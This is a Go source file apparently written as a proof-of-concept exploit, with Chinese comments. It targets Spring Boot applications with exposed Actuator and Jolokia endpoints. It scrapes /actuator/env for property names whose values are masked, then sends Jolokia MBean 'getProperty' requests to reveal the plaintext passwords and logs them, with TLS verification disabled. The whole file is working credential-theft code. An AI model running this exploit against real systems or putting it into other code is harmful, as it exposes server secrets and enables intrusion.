package poc

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"
)

// 处理url后的斜杠
func RemoveTrailingSlash(url string) string {
	if strings.HasSuffix(url, "/") {
		return url[:len(url)-1]
	}

	return url
}

func getFields(url string) []string {
	mySlice := []string{}
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // 忽略证书验证错误
	}
	transport := &http.Transport{
		TLSClientConfig: tlsConfig,
	}

	client := &http.Client{
		Transport: transport,
	}

	// 创建一个 GET 请求对象
	info := RemoveTrailingSlash(url) + "/actuator/env"
	req, err := client.Get(info)
	if err != nil {
		panic(err)
	}
	defer req.Body.Close()

	// 执行请求
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		panic(err)
	}

	// 匹配****前的字段
	re := regexp.MustCompile(`([^"]+)":{"value":"\*{6,}`)
	matches := re.FindAllStringSubmatch(string(body), -1)
	for _, v := range matches {
		mySlice = append(mySlice, v[1])
	}

	return mySlice
}

func GetPasswd1(version int, url string) (string, error) {
	AttributeName := getFields(url) //密码属性名称

	mbean := []string{
		"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager",
		"org.springframework.boot:name=SpringApplication,type=Admin",
	}
	//获取密码属性名
	done := false // 标记变量
	for _, mb := range mbean {
		if done {
			break // 如果已经退出，则跳过剩余的循环
		}
		//获取密码属性名
		for i := 0; i < len(AttributeName); i++ {
			if done {
				break // 如果已经退出，则跳过剩余的循环
			}
			springPayload := map[string]interface{}{
				"mbean":     mb,
				"operation": "getProperty",
				"type":      "EXEC",
				"arguments": []string{AttributeName[i]},
			}
			if version == 1 {
				payloadUrl := RemoveTrailingSlash(url) + "/jolokia"
				Status, err := getPasswd(payloadUrl, springPayload, AttributeName[i])
				if err != nil {
					log.Println("failed to get password:", err)
					return "", err
					break
				}
				if Status == "404" {
					log.Println("password not found")
					return Status, err
				}

				// TODO: do something with the password...
			} else if version == 2 {
				payloadUrl := RemoveTrailingSlash(url) + "/actuator/jolokia"
				Status, err := getPasswd(payloadUrl, springPayload, AttributeName[i])
				if err != nil {
					log.Println("failed to get password:", err)
					return "", err
					break
				}
				if Status == "404" {
					log.Println("password not found")
					return "", errors.New("password not found")
					done = true
					break // 设置标记变量并跳出循环
				}
				// TODO: do something with the password...
			} else {
				fmt.Println("error")
				return "", fmt.Errorf("unsupported version: %d", version)
			}
		}
	}
	return "", nil
}

func getPasswd(url string, springPayload map[string]interface{}, attributeName string) (string, error) {
	//跳过ssl认证
	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	//请求体
	requestBody, err := json.Marshal(springPayload)
	if err != nil {
		fmt.Println(err)
		return "", fmt.Errorf("Error:%v", err)
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client.Transport = tr
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(requestBody))
	if err != nil {
		fmt.Println(err)
		return "", fmt.Errorf("Error:%v", err)
	}
	req.Header.Add("Content-Type", "application/json")
	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return "", fmt.Errorf("Error:%v", err)
	}
	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		panic(err)
	}

	// 获取密码
	codeRe := regexp.MustCompile(`"status":(\d+)`)

	match := codeRe.FindStringSubmatch(string(body))

	if len(match) > 1 && match[1] == "200" {
		passwdRe := regexp.MustCompile(`"value":.([^\"]+)`)
		password := passwdRe.FindStringSubmatch(string(body))

		if password[1] == "ull," {
			log.Println("[-] 密码不存在或检查属性名是否正确 ")
			return "", nil
		} else {
			log.Println("[+] 属性", attributeName, "密码为：", password[1])
			return match[1], nil
		}
	} else if len(match) > 1 && match[1] == "404" {
		log.Println("[-] 状态码: ", match[1], "，构造连或密码字段存在问题")
		return match[1], nil
	} else {
		fmt.Println("[-] 获取密码失败:", body)
		return "", fmt.Errorf("failed to get password for attribute %s: %s", attributeName, body)
	}
}
